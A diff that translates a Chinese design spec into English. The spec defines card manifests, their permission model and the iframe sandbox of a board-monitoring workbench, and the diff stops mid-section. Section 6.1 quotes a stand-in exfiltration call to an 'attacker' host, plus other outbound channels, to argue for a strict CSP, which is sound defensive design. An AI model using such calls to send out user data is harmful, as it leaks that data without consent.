@@ -1,14 +1,14 @@
-> **来源与修订**：本文自前身工程 `DevBoardConsole\docs\spec\` 迁入（2026-11-12，Codex，提交 `c24b084`）。
-> 契约层为**权威文档**。**迁入后经 `0244852` 修订过**，2026-11-12 的评审又做了一轮修订
-> ——逐节来源见 `00-overview.md` §一之二。实现方式见仓库根目录的 `README.md`。
-# 卡片 manifest 格式
+> Source and revisions: this document was migrated from the predecessor project `DevBoardConsole\docs\spec\` (2026-11-12, Codex, commit `c24b084`).
+> The contract layer is the authoritative documentation. It was revised by `0244852` after the migration, and the review of 2026-11-12 revised it once more
+> — see `00-overview.md` section 1.2 for the per-section provenance. For the implementation see `README.md` at the repository root.
+# The Card Manifest Format
 
-> 一张卡 = 一个目录。`manifest.json` 声明它是什么、读什么、写什么。
-> 卡片即文件：放进目录就生效，改完热插拔。这是 AI 最擅长编辑的东西。
+> One card = one directory. `manifest.json` declares what it is, what it reads and what it writes.
+> A card is a file: putting it into a directory makes it effective, editing it hot-plugs it. This is the thing an AI is best at editing.
 
 ---
 
-## 一、一个 manifest 长什么样
+## 1. What a manifest looks like
 
 ```json
 {
@@ -16,9 +16,9 @@
   "kind": "Card",
 
   "id": "cpu-usage",
-  "name": "CPU 占用率",
+  "name": "CPU utilisation",
   "version": "1.0.0",
-  "description": "显示 CPU 总占用与每核占用",
+  "description": "Shows the overall CPU utilisation and the utilisation per core",
 
   "entry": "index.html",
 
@@ -44,131 +44,131 @@
 
 ---
 
-## 二、逐字段
+## 2. Field by field
 
-| 字段 | 必填 | 含义 |
+| Field | Required | Meaning |
 |---|---|---|
-| `apiVersion` | 是 | 契约版本 |
-| `id` | 是 | 卡片的稳定标识，全局唯一 |
-| `name` | 是 | 人类可读名 |
-| `version` | 是 | 卡片自己的版本 |
-| `entry` | 是 | 入口 HTML，相对于卡片目录 |
-| `requires.tags` | 否 | 这张卡**想**读的 tag。用于依赖检查与降级提示 |
-| `requires.actions` | 否 | 这张卡**想**触发的动作 |
-| `requires.workflows` | 否 | 这张卡**想**触发的**流程**（流程包，`05`） |
-| `requires.min_board_pack` | 否 | 最低板型包版本要求 |
-| `layout` | 否 | 栅格尺寸与最小尺寸 |
-| `permissions.read` | 是 | 这张卡被允许读的 tag。**超出此列表的读取一律拒绝** |
-| `permissions.write` | 是 | 这张卡被允许触发的动作 id。**超出此列表一律拒绝** |
-| `permissions.workflows` | 否 | 这张卡被允许触发的**流程 id**（精确 id，**不许通配符** ✓）。**超出此列表一律拒绝** |
-| `actions` | 否 | 卡片自己声明的**视图内动作**（见 §五） |
+| `apiVersion` | Yes | The contract version |
+| `id` | Yes | The stable identifier of the card, globally unique |
+| `name` | Yes | A human-readable name |
+| `version` | Yes | The version of the card itself |
+| `entry` | Yes | The entry HTML, relative to the card directory |
+| `requires.tags` | No | The tags this card wants to read. Used for the dependency check and for the degradation hint |
+| `requires.actions` | No | The actions this card wants to trigger |
+| `requires.workflows` | No | The workflows this card wants to trigger (workflow packs, `05`) |
+| `requires.min_board_pack` | No | The minimum board pack version required |
+| `layout` | No | The grid size and the minimum size |
+| `permissions.read` | Yes | The tags this card is allowed to read. Every read outside this list is refused |
+| `permissions.write` | Yes | The action ids this card is allowed to trigger. Everything outside this list is refused |
+| `permissions.workflows` | No | The workflow ids this card is allowed to trigger (exact ids, no wildcards ✓). Everything outside this list is refused |
+| `actions` | No | The view-local actions the card declares for itself (see section 5) |
 
-### 2.2 模式的包含关系
+### 2.2 The inclusion relation between the patterns
 
-两个字段都支持**模式**，所以「requires ⊆ permissions」不是字符串相等，而是
-**模式覆盖**：
+Both fields support patterns, so "requires ⊆ permissions" is not string equality but
+pattern coverage:
 
-> `requires` 里的每一项，必须被 `permissions` 里的**某一项**覆盖。
+> Every entry in `requires` must be covered by some entry in `permissions`.
 
 ```
 requires:   ["cpu.core.3.usage"]
-permissions: ["cpu.core.*.usage"]     ← 覆盖，成立
+permissions: ["cpu.core.*.usage"]     ← covered, so it holds
 ```
 
-这条规则让卡片既能声明精确需求，又能申请一个更宽的权限范围。反过来
-（`requires` 宽、`permissions` 窄）是不成立的。
+This rule lets a card state an exact requirement and still ask for a wider permission range. The other way
+round (`requires` wide, `permissions` narrow) does not hold.
 
-**注意这条规则的代价**：一张卡如果声明 `cpu.core.*.usage`，它就获得了所有核的读权限。
-这没问题——读权限本身是低风险的，而且语义 tag 契约保证了它读不到别的板子的东西。
+Note the cost of this rule: a card that declares `cpu.core.*.usage` gains read permission on every core.
+That is no problem — read permission is low risk in itself, and the semantic tag contract guarantees that it cannot read anything belonging to another board.
 
-### 2.3 `permissions.write` 不支持模式
+### 2.3 `permissions.write` does not support patterns
 
-`permissions.read` 支持模式，`permissions.write` **只支持精确的动作 id**。
+`permissions.read` supports patterns, `permissions.write` supports exact action ids only.
 
-理由是**不对称的风险**：读一个 `cpu.usage` 没有副作用；写一个动作会改板子。
-模式让授权范围变大，对读来说方便，对写来说危险。
+The reason is the asymmetry of the risk: reading a `cpu.usage` has no side effect, writing an action changes the board.
+Patterns widen the scope of an authorisation, which is convenient for reading and dangerous for writing.
 
-所以 `permissions.write: ["backlight.*"]` 是**非法**的，校验器报错。
+So `permissions.write: ["backlight.*"]` is illegal, and the validator reports an error.
 
-`requires.actions` 同理用精确 id（动作 id 本身不带通配约定）。
+`requires.actions` likewise uses exact ids (an action id itself carries no wildcard convention).
 
-### 2.4 实际生效的写权限
+### 2.4 The effective write permission
 
-**有效写权限 = `permissions.write`** ✓ —— **就是 manifest 说的那些** ✓。
+The effective write permission is `permissions.write` ✓ — exactly what the manifest says ✓.
 
-> **2026-11-16 改**（**ADR-D46** ✓ · 用户原话：「**板子描述文件说了算**」
-> 「**一张卡片点了他就执行了**」✓）：
-> → **不再有第二份「谁授过」** ✓（**同一件事记两遍** ✗ —— **迟早对不上** ✗）。
-> → **板上能做什么由板型包决定** ✓（**板型包说了算** ✓）；
->   **这张卡能做什么由它的 manifest 决定** ✓。
-> → **会话层守着「声明之外的一律 denied」** ✓ —— **卡片说一套做一套是不行的** ✓。
+> Changed on 2026-11-16 (ADR-D46 in the implementation-layer decision record ✓ · the user's own words: "the board description file
+> has the final say", "click a card and it runs" ✓):
+> → There is no longer a second record of "who authorised what" ✓ (writing the same thing down twice ✗ — that eventually disagrees with itself ✗).
+> → What the board accepts is decided by the board pack ✓ (the board pack has the final say ✓);
+>   what the card can do is decided by its manifest ✓.
+> → The session layer keeps "anything outside the declaration is denied" ✓ — a card that says one thing and does another is not allowed ✓.
 
-**流程也一样**（`05` §7.7 ✓）：
+The same holds for workflows (`05` section 7.7 ✓):
 
 ```
-有效流程权限 = permissions.workflows
+effective workflow permission = permissions.workflows
 ```
 
-→ **流程没有第二道** ✓（**2026-11-16 砍掉** ✓ · ADR-D48 ✓）：
-**流程包的存在本身就是说明** ✓（**用户原话**：「**流程存在本身即说明了**」✓）
-→ **闸在设置里的统一权限区** ✓（`05` §7.2 ✓ · ADR-D47 ✓）：**流程那一行开关** ✓
-→ **那一行会把每一步命令都打出来** ✓（`05` §7.4 ✓ —— **开关不只是「开一个文件名」** ✓）。
+→ A workflow has no second gate ✓ (removed on 2026-11-16 ✓ · ADR-D48 ✓):
+the existence of a workflow pack is the statement in itself ✓ (the user's own words: "the existence of a workflow is itself the explanation" ✓)
+→ the gate is the unified permission area in the settings ✓ (`05` section 7.2 ✓ · ADR-D47 ✓): the switch on the workflow row ✓
+→ that row prints every command of every step ✓ (`05` section 7.4 ✓ — the switch is not "opening one file name" ✓).
 
-**装卡不再要「同意」** ✓（`04` §2.3 ✓ · ADR-D46 ✓）：
-→ **要写的动作板型包里没有 → 不装** ✓（**板型包说了算** ✓）；
-→ **都在 → 直接装** ✓（**点一下就是同意** ✓）。
+Installing a card no longer asks for "consent" ✓ (`04` section 2.3 ✓ · ADR-D46 ✓):
+→ an action to write that the board pack does not have → do not install it ✓ (the board pack has the final say ✓);
+→ all of them are there → install it directly ✓ (one click is the consent ✓).
 
-**但「谁能写板子」由设置里那一张表决定** ✓（**统一权限区** ✓ · ADR-D47 ✓）：
-→ **卡片写板子：默认禁止** ✓（**宿主验不了「人点了卡片上的按钮」** ✗ → **默认不给** ✓）
-→ **卡片触发流程：默认允许** ✓（**闸在设置里那行开关** ✓ —— **流程包的存在本身就是说明** ✓）
-→ **agent：默认允许** ✓（**它那边本来就有人的确认** ✓）
-→ **想改就在设置里改那个开关** ✓（**一次** ✓ · **不再有弹窗** ✓）。
+But "who may write to a board" is decided by the one table in the settings ✓ (the unified permission area ✓ · ADR-D47 ✓):
+→ a card writing the board: forbidden by default ✓ (the host cannot verify "a human clicked the button on the card" ✗ → do not grant it by default ✓)
+→ a card triggering a workflow: allowed by default ✓ (the gate is the switch on that row in the settings ✓ — the existence of a workflow pack is the statement in itself ✓)
+→ an agent: allowed by default ✓ (it has the confirmation of a human on its side ✓)
+→ to change it, change that switch in the settings ✓ (once ✓ · no more dialog ✓).
 
-### 2.5 manifest 的 schema 是封闭的
+### 2.5 The schema of the manifest is closed
 
-**未知字段一律报错**，在**每一层**。
+An unknown field is always an error, at every level.
 
-这和板型包是同一条规则，理由也一样：被静默忽略的字段，就是拼错的字段。
+This is the same rule as the one for board packs, for the same reason: a field that is silently ignored is a field that was typed wrong.
 
 ```
 "permissions": { "read": [...], "write": [...], "network": true }
-                                       ^^^^^^^^ 报错，不是忽略
+                                       ^^^^^^^^ an error, not ignored
 ```
 
-这条规则是 §六「v1 没有 `permissions.network`」这条承诺的**执行者**。
-没有它，一张卡可以声明一个运行时看不懂的字段，然后以为自己有网络——
-而实际上它没有，或者更糟，运行时按别的方式处理了它。
+This rule is the enforcer of the promise in section 6, "v1 has no `permissions.network`".
+Without it a card could declare a field the runtime does not understand and believe that it has network access —
+while in fact it has none, or worse, the runtime handles it in some other way.
 
-| 层 | 封闭 |
+| Layer | Closed |
 |---|---|
-| 顶层 | 是 |
-| `requires` | 是 |
-| `permissions` | 是 |
-| `layout` | 是 |
-| `actions[]` | 是 |
+| The top level | Yes |
+| `requires` | Yes |
+| `permissions` | Yes |
+| `layout` | Yes |
+| `actions[]` | Yes |
 
 ---
 
-## 三、权限模型
+## 3. The permission model
 
-### 3.1 为什么是两层
+### 3.1 Why there are two layers
 
-卡片跑在沙箱里（iframe + 白名单 API），但「沙箱」只保证卡片**搞不垮工作台**，不保证卡片**不会乱动板子**。
+A card runs in a sandbox (an iframe plus a whitelist API), but the sandbox only guarantees that the card cannot take the workbench down with it. It does not guarantee that the card will not tamper with the board.
 
-两件事必须分开：
+Two things have to be kept apart:
 
-| 防护 | 防的是什么 | 手段 |
+| Protection | What it protects against | Means |
 |---|---|---|
-| 代码沙箱 | 坏卡搞垮工作台、偷读宿主机文件 | iframe + 白名单 API + 无 Node 集成 |
-| 动作权限 | 卡片乱写板子 | `permissions.write`（**声明即权限** ✓）+ **板型包的分级与地板** ✓ |
+| The code sandbox | a bad card taking the workbench down, reading the files of the host | an iframe plus a whitelist API plus no Node integration |
+| The action permission | the card writing to the board | `permissions.write` (the declaration is the permission ✓) plus the grading and the floor of the board pack ✓ |
 
-一张卡能读 `cpu.usage` 是**读**，不危险。能写 `/sys/...` 是**写**，要授权。读权限用 tag 名声明，写权限用动作 id 声明——动作 id 比 tag 名更粗，所以写权限天然更严格。
+A card that can read `cpu.usage` is reading, which is not dangerous. A card that can write `/sys/...` is writing, which needs an authorisation. Read permission is declared with tag names, write permission with action ids — an action id is coarser than a tag name, so write permission is the stricter one by nature.
 
-### 3.2 分级
+### 3.2 Grading
 
-沿用板型包那**两档**（`reversible` / `destructive`），卡片侧只声明
-「我要用哪一档的动作」——具体哪一档由**板型包**说了算（§5.1），
-卡片只声明「我要用这个动作」：
+The card side reuses the two grades of the board pack (`reversible` / `destructive`); the card only declares
+"which grade of actions I want to use" — which grade is actually in force is decided by the board pack ✓ (section 5.1),
+the card only declares "I want to use this action":
 
 ```json
 "permissions": {
@@ -177,204 +177,204 @@ permissions: ["cpu.core.*.usage"]     ← 覆盖，成立
 }
 ```
 
-> **只有两档。** 早期版本写过三档（`read` / `reversible` / `destructive`），
-> 与 `spec/02` §4.2 冲突，已按契约口径统一：**只读走 tag，不是一种动作**。
+> There are only two grades. An early version wrote three (`read` / `reversible` / `destructive`),
+> which conflicted with section 4.2 of `spec/02`; it has been unified to the wording of the contract: a read goes through a tag, it is not an action.
 
-**卡片侧没有「授权流程」** ✓（**2026-11-16 改** ✓ · ADR-D46 ✓）：
+There is no authorisation process on the card side ✓ (changed on 2026-11-16 ✓ · ADR-D46 ✓):
 
-1. **有效写权限 = `permissions.write`** ✓ —— **就是 manifest 说的那些** ✓。
-2. **声明之外的动作一律 denied** ✓（**会话层守着** ✓ —— 卡片说一套做一套是不行的 ✓）。
-3. **动作在不在板型包里**也由宿主判 ✓（不在 → `not_found` ✓）。
-4. **危险等级与地板**（`02-board-pack.md` §5.2 ✓）**在板型包那条路上就查过了** ✓
-   （**动作** ✓ 规则 16 ✓ · **reader** ✓ 规则 28 ✓）→ **卡片那条路不再复查** ✓
-   （**复查了也没有人能批准** ✗ —— **界面里没有那道闸** ✗ → **问了就没人答** ✗）。
+1. The effective write permission is `permissions.write` ✓ — exactly what the manifest says ✓.
+2. Any action outside the declaration is denied ✓ (the session layer keeps it ✓ — a card that says one thing and does another is not allowed ✓).
+3. Whether the action is in the board pack is decided by the host as well ✓ (when it is not → `not_found` ✓).
+4. The danger grade and the floor ✓ (section 5.2 of `02-board-pack.md`) have already been checked on the board pack path ✓
+   (action ✓ rule 16 ✓ · reader ✓ rule 28 ✓) → the card path does not check them again ✓
+   (a second check would have nobody to approve it ✗ — there is no such gate in the interface ✗ → asking would be asking into the void ✗).
 
-**`guard` 仍然是界** ✓（`02-board-pack.md` §5.5 ✓）：卡片传的值**超出 `guard`** →
-**拒绝** ✓（不是放行 ✓）—— `guard` 让「这个动作能改到什么范围」有确切所指 ✓。
+`guard` is still the boundary ✓ (section 5.5 of `02-board-pack.md` ✓): a value the card passes that is outside the `guard` →
+refused ✓ (not let through ✓) — the `guard` gives "how far this action may change things" a definite meaning ✓.
 
-> **为什么 agent 那条路还要问**（`04` §2.4.1 ✓）：**agent 不是人** ✓ ——
-> 它点不了按钮 ✓ → **它调 destructive 动作必须有人点头** ✓。
+> Why the agent path still asks ✓ (section 2.4.1 of `04` ✓): an agent is not a human ✓ —
+> it cannot click a button ✓ → a destructive action it calls must have a human say yes ✓.
 
-**只读不是动作。** 只读走 tag，`permissions.read` 不需要授权流程——读一个
-`cpu.usage` 没有副作用，不需要问用户。板型包里也没有 `danger: readonly` 的动作：
-动作一律是写。
+A read is not an action. A read goes through a tag, `permissions.read` needs no authorisation process — reading a
+`cpu.usage` has no side effect, there is no reason to ask the user. The board pack has no action with `danger: readonly` either:
+an action is always a write.
 
-### 3.3 卡片不能自己提权
+### 3.3 A card cannot raise its own permissions
 
-卡片**不能**在运行时请求新权限。**权限就是它的 manifest 声明** ✓（§2.4 ✓）。
-卡片想要更多，只能改 manifest（**那要走一次新的安装** ✓ —— **不是运行时提权** ✓）。
+A card cannot request new permissions at runtime. The permissions are what its manifest declares ✓ (section 2.4 ✓).
+A card that wants more has to change the manifest (and that goes through a new installation ✓ — it is not a runtime escalation ✓).
 
-**改 manifest → 权限集跟着变** ✓：实例 id 里含**卡片目录内容指纹** ✓
-（`manifest.json` 在内 ✓）→ **改了就换实例** ✓ → **新会话按新声明算权限** ✓。
-→ **一张卡不能在两次热重载之间偷偷加进危险动作然后继续用旧的授权** ✗
-—— **因为没有「旧的授权」可用了** ✓。
+Changing the manifest → the permission set changes with it ✓: the instance id contains a fingerprint of the contents of the card directory ✓
+(`manifest.json` included ✓) → a change replaces the instance ✓ → a new session computes the permissions from the new declaration ✓.
+→ A card cannot slip a dangerous action in between two hot reloads and then keep using the old authorisation ✗
+— because there is no old authorisation left to use ✓.
 
 ---
 
-## 四、读侧：卡片怎么拿数据
+## 4. The read side: how a card obtains data
 
-卡片不直接碰连接层。运行时给它一个**受控 API**：
+A card does not touch the connection layer. The runtime gives it a controlled API:
 
 ```js
-// 在卡片 iframe 内可用
+// available inside the card iframe
 const value = await cockpit.tags.get("cpu.usage");
 // => { value: 37.2, unit: "percent", status: "ok", at: 1762910000123 }
 
-cockpit.tags.subscribe("cpu.usage", (v) => { /* 每次刷新 */ });
+cockpit.tags.subscribe("cpu.usage", (v) => { /* on every refresh */ });
 ```
 
-运行时保证：
+The runtime guarantees:
 
-- 只返回 `permissions.read` 里列出的 tag
-- 返回的是**状态化**的值（§`01` 的五态），不是裸数字
-- 订阅是**按 reader 刷新周期**推送，不是卡片自己轮询
+- It returns only the tags listed in `permissions.read`
+- What it returns is a stateful value (the five states of `01`), not a bare number
+- The subscription is pushed on the refresh cycle of the reader, not polled by the card
 
-**卡片不能自己轮询。** 卡片自己轮询 = 每张卡各自 fork 一个 adb shell = 板子看起来 100% 忙，而且 N 张卡时负载翻 N 倍。运行时是唯一的轮询者，卡片是订阅者。
+A card cannot poll by itself. A card that polls by itself forks an adb shell per card — the board then looks 100% busy, and the load multiplies with the number of cards. The runtime is the only poller, the cards are subscribers.
 
-> **本节与 §七 讲的是同一件事。** 完整的 API 清单、签名与错误语义在 §七，
-> 那里是**唯一**的定义处；本节只保留三句原则，避免同一套 API 有两份描述。
-> （历史上这里与 §七 是两段一字不差的拷贝，改一处忘一处就会漂移。）
+> This section and section 7 are about the same thing. The complete list of the API, its signatures and its error semantics are in section 7,
+> which is the only place they are defined; this section keeps three principles, so that one set of API does not end up with two descriptions.
+> (Historically this section and section 7 were two word-for-word copies; changing one and forgetting the other made them drift.)
 
 ---
 
-## 五、写侧：控制闭环
+## 5. The write side: the control loop
 
-### 5.1 卡片声明的控制
+### 5.1 The controls a card declares
 
 ```json
 "actions": [
   {
     "id": "toggle-npu",
-    "label": "NPU 接入开关",
+    "label": "NPU pipeline switch",
     "target": "npu.pipeline.toggle",
     "params": { "enabled": { "type": "boolean" } }
   }
 ]
 ```
 
-`actions[]` 里每一项的字段：
+The fields of each entry in `actions[]`:
 
-| 字段 | 必填 | 含义 |
+| Field | Required | Meaning |
 |---|---|---|
-| `id` | 是 | 卡片内的动作 id，全局唯一（卡片自己的命名空间） |
-| `label` | 是 | 人类可读名 |
-| `target` | 否 | 板型包里的动作 id。**有 = 板型动作**，无 = 视图内动作 |
-| `params` | 否 | 参数 schema，结构与板型包的 `params` 一致（`02` §4.3） |
+| `id` | Yes | The action id inside the card, globally unique (the card's own namespace) |
+| `label` | Yes | A human-readable name |
+| `target` | No | An action id of the board pack. Present = a board action, absent = a view-local action |
+| `params` | No | The parameter schema, the same shape as the `params` of a board pack (section 4.3 of `02`) |
 
-**`target` 有无决定这个动作的类别**：
+The presence of `target` decides the category of the action:
 
-| | 视图内动作（无 `target`） | 板型动作（有 `target`） |
+| | A view-local action (no `target`) | A board action (a `target`) |
 |---|---|---|
-| 是什么 | 卡片内部的一次操作 | 板子接受的一次写入 |
-| 例 | 切换图表的显示模式 | `backlight.set` |
-| 权限 | **不需要**授权（不碰板子） | 需要（§3.2） |
-| `danger` / `readback` | 不适用 | 由**板型包**说了算 |
-| 校验 | §九 规则 12 | §九 规则 7（`target` 必须在 `permissions.write` 里） |
+| What it is | an operation inside the card | a write the board accepts |
+| Example | switching the display mode of the chart | `backlight.set` |
+| Permission | no authorisation needed (it does not touch the board) | needed (section 3.2) |
+| `danger` / `readback` | not applicable | decided by the board pack |
+| Validation | rule 12 in section 9 | rule 7 in section 9 (`target` has to be in `permissions.write`) |
 
-**卡片不声明 `danger`。** 危险等级由**板型包**说了算——板子知道「重启自己是破坏性的」，
-卡片不知道。卡片的 `danger` 字段如果存在，会被校验器拒绝（schema 封闭，§2.5）。
+A card does not declare `danger`. The danger grade is decided by the board pack ✓ — the board knows that restarting itself is destructive,
+the card does not. A `danger` field on a card is refused by the validator (the schema is closed, section 2.5).
 
-同样，卡片不声明 `readback`——回读由板型包的动作定义，运行时按板型包的来。
-卡片声明自己的 `readback` 会和板型包冲突，而**板型包赢**，因为它是离板子最近的那一层。
+The same holds for `readback`: the readback is defined by the action of the board pack, and the runtime follows the board pack.
+A card that declares its own `readback` conflicts with the board pack, and the board pack wins, because it is the layer closest to the board.
 
-> **这条曾经自相矛盾**：早期版本既说「视图内动作不需要授权」，
-> 又在校验规则里要求 `actions[].target` 必须出现在 `permissions.write`——
-> 于是视图内动作被迫去授权一个它根本没有的板型动作。
-> 现在的规则是按 `target` 有无分流，两种动作各走各的校验。
+> This rule contradicted itself once: an early version said both that "a view-local action needs no authorisation",
+> and, in the validation rules, that `actions[].target` has to appear in `permissions.write` —
+> so a view-local action was forced to authorise a board action it did not have.
+> The rule now branches on the presence of `target`, and the two kinds of action go through their own validation.
 
-### 5.2 闭环的四步
+### 5.2 The four steps of the loop
 
-卡片里的开关按钮，完整流程：
+The complete flow of a toggle button in a card:
 
 ```
-用户点击
+the user clicks
    ↓
-卡片调 cockpit.actions.invoke("toggle-npu", {enabled: true})
+the card calls cockpit.actions.invoke("toggle-npu", {enabled: true})
    ↓
-运行时检查：① 该动作在 permissions.write 里吗？
-           ② 该动作的 danger 等级需要二次确认吗？
-           ③ 参数落在该动作的 guard 域内吗？（超出则同样要确认）
-           ④ 板型包里这个动作存在吗？
+the runtime checks: ① is the action in permissions.write?
+           ② does the danger grade of the action need a second confirmation?
+           ③ do the parameters fall inside the guard domain of the action? (outside it, a confirmation is required as well)
+           ④ does this action exist in the board pack?
    ↓
-执行命令 → 回读 readback
+the command runs → the readback is taken
    ↓
-把「回读到的真实状态」回给卡片
+the real state that was read back is returned to the card
    ↓
-卡片按回读值渲染按钮（不是按用户点了什么）
+the card renders the button from the readback value (not from what the user clicked)
 ```
 
-**回读是强制的。** 运行时在动作执行后按 `readback` 取值，把这个值作为动作结果返回。卡片**必须**用返回值渲染，不能自己乐观更新。
+The readback is mandatory. After the action has run, the runtime takes the value according to `readback` and returns it as the result of the action. The card must render from the returned value and must not update optimistically on its own.
 
 ```js
 const r = await cockpit.actions.invoke("toggle-npu", { enabled: true });
 // r = { ok: true, readback: { value: true, status: "ok" } }
-button.setState(r.readback.value);   // 用回读值
+button.setState(r.readback.value);   // from the readback value
 ```
 
-### 5.3 回读失败
+### 5.3 A failed readback
 
-命令返回了，但状态没变（比如板子上的服务没起来）：
+The command returned, but the state did not change (for example the service on the board did not come up):
 
 ```js
 // r = { ok: false, reason: "readback_mismatch", expected: true, actual: false }
 ```
 
-卡片应该显示「命令已发出，未确认生效」，并保留实际值。**不允许显示成已开启。**
+The card should show "the command was sent, the effect is not confirmed" and keep the actual value. It is not allowed to show it as switched on.
 
-这就是「驾驶舱」和「遥控器」的分界线——遥控器按你按了按钮来显示，驾驶舱按板子实际在做什么来显示。
+This is the boundary between a cockpit and a remote control — a remote control shows what you pressed, a cockpit shows what the board is actually doing.
 
-### 5.4 视图内动作 vs 板型动作
+### 5.4 View-local actions versus board actions
 
-见 §5.1 的对照表（两类动作按 `target` 有无分流）。
+See the comparison table in section 5.1 (the two kinds of action are branched by the presence of `target`).
 
 ---
 
-## 六、沙箱
+## 6. The sandbox
 
-卡片跑在 iframe 里。
+A card runs in an iframe.
 
-| 规则 | 内容 |
+| Rule | Content |
 |---|---|
-| 位置 | 独立 iframe，`sandbox="allow-scripts"`（**不给** `allow-same-origin`） |
-| API | 只有 `cockpit.*` 白名单方法 |
-| 网络 | **禁**。由宿主注入 CSP 关闭（§6.1），且 v1 无法申请。要联网必须升契约版本 |
-| 存储 | 只能写卡片自己的命名空间（布局、偏好），经 `cockpit.storage.*` 走（§6.2） |
-| 文件 | 不可读写宿主机文件系统（除卡片目录内的相对资源与 §6.2 的存储接口） |
-| 崩溃 | 单卡崩溃不影响其他卡，也不影响工作台 |
+| The location | an independent iframe, `sandbox="allow-scripts"` (without `allow-same-origin`) |
+| The API | only the whitelisted `cockpit.*` methods |
+| The network | forbidden. It is closed by a CSP injected by the host (section 6.1), and v1 cannot ask for it. Networking requires a contract version bump |
+| The storage | it may only write its own namespace (layout, preferences), through `cockpit.storage.*` (section 6.2) |
+| The files | it can neither read nor write the file system of the host (apart from the relative resources in its own directory and the storage interface of section 6.2) |
+| A crash | one card crashing does not affect the other cards, nor the workbench |
 
-**v1 没有 `permissions.network` 之类的字段。** 没声明就是没有——这条规则不需要字段来
-表达，因为卡片**无法**声明它。
+v1 has no field like `permissions.network`. Not declared means not there — this rule does not need a field to
+express itself, because a card cannot declare it.
 
-这不是省事，是一个明确的取舍：**一张 AI 写的卡片，如果能随便联网，它就能把用户板子上的
-数据发到任何地方。** v1 宁可让卡片什么都做不了，也不给这个口子。
+This is not laziness, it is a deliberate trade-off: a card written by an AI that can reach the network at will can send the data on the user's board
+anywhere. v1 would rather let the card do nothing at all than open that door.
 
-真要放开，需要：
+To open it for real:
 
-1. 契约升版本，加一个显式的字段；
-2. 安装卡片时**单独**征求授权（不和动作授权混在一起）；
-3. 授权绑定到具体的域名，不是「允许联网」。
+1. The contract version is bumped and an explicit field is added;
+2. Installing the card asks for a separate authorisation (not mixed with the action authorisation);
+3. The authorisation is bound to specific domains, not to "the network is allowed".
 
-**卡片的沙箱和宿主的进程模型是两件事。** 卡片跑在 iframe 里，需要一个内嵌的网页运行时
-（Electron 的 `<webview>` / `BrowserView`、或系统 WebView2 都行）；这不改变契约本身，
-但**会**影响「宿主怎么实现」的选择。本轮规格不锁这一点。
+The sandbox of a card and the process model of the host are two different things. A card runs in an iframe and needs an embedded web runtime
+(Electron's `<webview>` / `BrowserView`, or the system WebView2, will do); this does not change the contract itself,
+but it does affect the choice of how the host implements it. This round does not settle that point.
 
-**这条沙箱选择带来两件必须写下来的事**（2026-11-14，ADR-D28）：
+This sandbox choice brings two things that have to be written down (2026-11-14, ADR-D28):
 
-1. **卡片之间互不可见**。每个 iframe 是一个**独立的不透明源**——它们彼此不同源，
-   谁也读不到谁的 DOM、存储与 cookie。
-   （因此也**碰不到宿主的存储**：卡片的 `localStorage` 直接抛 `SecurityError`，
-   这就是 §6.2 要宿主代管存储的**前提**，不是将就。）
-2. **preload 进不了 iframe**。宿主的 preload 只挂在窗口上，**子 iframe 里没有**——
-   所以 `cockpit.*` **不能**靠 `contextBridge` 递进去，
-   **必须**由宿主**注入一个 bridge 脚本**（同源提供）来实现（§7.7）。
+1. Cards cannot see each other. Every iframe is an independent opaque origin — they are of different origins,
+   and none of them can read the DOM, the storage or the cookies of another.
+   (That is also why they cannot reach the storage of the host: the `localStorage` of a card throws a `SecurityError`
+   straight away. That is the premise of section 6.2, which is why the host has to hold the storage on behalf of the cards — it is not a compromise.)
+2. The preload does not reach the iframe. The preload of the host is attached to the window only, and a child iframe has none —
+   so `cockpit.*` cannot be handed in through `contextBridge`; it has to be implemented by the host injecting a bridge script
+   (served from the same origin) (section 7.7).
 
-### 6.1 网络怎么真的被关掉
+### 6.1 How the network is really closed
 
-**`sandbox` 属性不限制网络。** 不给 `allow-same-origin` 只是让卡片拿不到宿主的源、
-DOM 与存储；卡片在自己的不透明源里照样能 `fetch('https://attacker/?d=' + data)`、
-`new WebSocket(...)`、`navigator.sendBeacon(...)`、`<img src="https://...">`。
+The `sandbox` attribute does not restrict the network. Leaving out `allow-same-origin` only keeps the origin, the DOM and the storage of the host
+away from the card; inside its own opaque origin the card can still `fetch('https://attacker/?d=' + data)`,
+`new WebSocket(...)`, `navigator.sendBeacon(...)`, `<img src="https://...">`.
 
-所以「v1 无网络」这条承诺必须由**宿主**执行，具体是**注入 CSP 响应头**：
+So the promise "no network in v1" has to be enforced by the host, specifically by injecting a CSP response header:
 
 ```
 Content-Security-Policy:
@@ -389,58 +389,58 @@ Content-Security-Policy:
   base-uri 'none';
 ```
 
-| 指令 | 值 | 为什么 |
+| Directive | Value | Why |
 |---|---|---|
-| `default-src` | `'none'` | 默认全禁，逐项放开 |
-| `script-src` | `'self'` | 卡片只能跑自己目录里的脚本 |
-| `connect-src` | `'none'` | **禁掉 `fetch` / `XHR` / `WebSocket` / `EventSource`** |
-| `img-src` | `'self' data:` | 只允许本地与内联 data:，断掉 `<img>` 外传通道 |
-| `form-action` / `frame-src` / `base-uri` | `'none'` | 断掉表单外传、嵌套 frame、`<base>` 改写 |
+| `default-src` | `'none'` | everything is closed by default, opened item by item |
+| `script-src` | `'self'` | the card may only run scripts from its own directory |
+| `connect-src` | `'none'` | this closes `fetch` / `XHR` / `WebSocket` / `EventSource` |
+| `img-src` | `'self' data:` | only local and inline `data:` are allowed, which closes the `<img>` exfiltration channel |
+| `form-action` / `frame-src` / `base-uri` | `'none'` | they close form exfiltration, nested frames and the rewriting of `<base>` |
 
-**CSP 是契约的一部分**：宿主**必须**注入它，卡片**不能**覆盖它
-（`connect-src` 不可被卡片放宽）。CSP 由宿主在响应 `cockpit://card/...` 时注入，
-不是卡片目录里的 `meta` 标签——`meta` 里的 CSP 无法限制它自己，
-且卡片可以删掉它。
+The CSP is part of the contract: the host must inject it, and the card cannot override it
+(`connect-src` cannot be relaxed by the card). The host injects the CSP when it answers `cockpit://card/...`,
+not through a `meta` tag in the card directory — the CSP in a `meta` tag cannot restrict itself,
+and the card can delete it.
 
-**违反 CSP 时的表现**：浏览器的 CSP 违规会记在卡片运行时日志里（`04` §2.3 的
-`get_card_runtime_log` 可见），agent 因此能看到「这张卡试图联网」。
+What a violation of the CSP looks like: the CSP violation of the browser is recorded in the card runtime log (visible in
+`get_card_runtime_log` in section 2.3 of `04`), so the agent can see that the card tried to reach the network.
 
-### 6.2 存储怎么兑现
+### 6.2 How the storage is honoured
 
-契约承诺「卡片只能写卡片自己的命名空间」，但在不给 `allow-same-origin` 的 iframe 里，
-`localStorage` / `sessionStorage` / `IndexedDB` **全部抛 `SecurityError`**
